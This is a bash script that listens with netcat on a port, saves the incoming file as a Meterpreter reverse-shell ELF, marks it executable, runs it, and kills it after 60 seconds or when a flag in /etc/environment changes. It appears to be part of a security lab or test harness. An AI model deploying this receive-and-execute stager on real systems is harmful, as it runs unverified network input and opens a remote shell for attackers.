#!/bin/bash

# receiver.sh - A script to receive a file over a network, execute it, and monitor its execution.

# Description:
# This script listens on a specified port to receive a file using netcat, saves it to a specified directory,
# makes the file executable, and executes it. It monitors the execution of the file and terminates it if it
# runs for more than 60 seconds or if a specific condition (COMPLETE variable) is met.

# Variables:
# - SAVE_DIR: Directory where the received file will be saved.
# - FILE_NAME: Name of the file to be received and executed.
# - RECEIVER_PORT: Port number on which the script listens for incoming file transfer.

# Behavior:
# 1. Sets the COMPLETE variable in /etc/environment to 0.
# 2. Creates the save directory if it does not exist.
# 3. Listens on the specified port using netcat to receive the file.
# 4. Saves the received file to the specified directory.
# 5. Makes the received file executable.
# 6. Executes the file in the background.
# 7. Monitors the execution:
#    - Checks the COMPLETE variable in /etc/environment.
#    - Terminates the process if it runs for more than 60 seconds.
# 8. Terminates the process once the COMPLETE variable changes from 0.

# Exit Codes:
# - 0: Script executed successfully.
# - 1: File transfer failed or process exceeded 60 seconds.

# Prerequisites:
# - The script requires sudo privileges to modify /etc/environment and terminate processes.
# - Ensure netcat (nc) is installed on the system.

# Usage:
# Run the script to start listening for a file transfer on the specified port.
# Example: ./receiver.sh

SAVE_DIR="$HOME/Documents"
FILE_NAME="meterpreter_reverse_x64.elf"
RECEIVER_PORT="1234"  # Port to listen on

# Set COMPLETE to 0
sudo sed -i 's/^COMPLETE=.*/COMPLETE=0/' /etc/environment

# Create the save directory if it doesn't exist
mkdir -p "$SAVE_DIR"

# Receive the file using netcat
echo "Listening for the file on port $RECEIVER_PORT..."
nc -l -p "$RECEIVER_PORT" > "$SAVE_DIR/$FILE_NAME"

if [ $? -eq 0 ]; then
    echo "File received successfully and saved to $SAVE_DIR/$FILE_NAME."
else
    echo "Failed to receive file."
    exit 1
fi

chmod +x "$SAVE_DIR/$FILE_NAME"
"$SAVE_DIR/$FILE_NAME" &

# Get the process ID of the executed file
PID=$!

START_TIME=$(date +%s)

# Wait for COMPLETE to change from 0 or for the process to run more than 60 seconds
while [ "$(grep -oP '^COMPLETE=\K.*' /etc/environment)" = "0" ]; do
    CURRENT_TIME=$(date +%s)
    ELAPSED_TIME=$((CURRENT_TIME - START_TIME))

    if [ $ELAPSED_TIME -gt 60 ]; then
        echo "Process exceeded 60 seconds. Exiting with status 1."
        sudo pkill -f "$SAVE_DIR/$FILE_NAME"  # Kill the process if it's still running
        exit 1
    fi
    sleep 1
done

# Kill the process once COMPLETE changes
sudo pkill -f "$SAVE_DIR/$FILE_NAME"

exit 0
